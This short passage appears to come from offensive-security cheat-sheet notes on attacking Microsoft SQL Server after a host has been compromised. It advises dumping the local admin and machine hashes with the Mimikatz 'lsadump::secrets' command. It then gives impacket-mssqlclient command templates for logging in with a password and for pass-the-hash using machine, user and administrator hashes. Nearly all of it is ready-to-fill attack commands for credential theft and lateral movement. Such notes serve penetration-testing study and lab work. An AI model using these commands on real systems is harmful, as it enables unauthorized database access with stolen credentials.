If you get NT AUTHORITY\SYSTEM access to a machine where an MSSQL database is running then also dump the local admin hash and connect to the database, as local admins are often sysadmin. We can also get the machine hash from Mimikatz using `lsadump::secrets` and use that to login and see what we can do.

> With password (Try with and without -windows-auth):

```
impacket-mssqlclient user:password@IP <-windows-auth>
```

> With machine hash:

```
impacket-mssqlclient '<domain>/<hostname>$'@<target_hostname>.<domain> -hashes :<machine_hash> -windows-auth
```

> With user hash:

```
impacket-mssqlclient <domain>/<user>@<target_ip> -hashes :<hash> -windows-auth
```

> With administrator hash:

```
impacket-mssqlclient -windows-auth -no-pass administrator@<target_ip> -hashes :<admin_hash> 
```
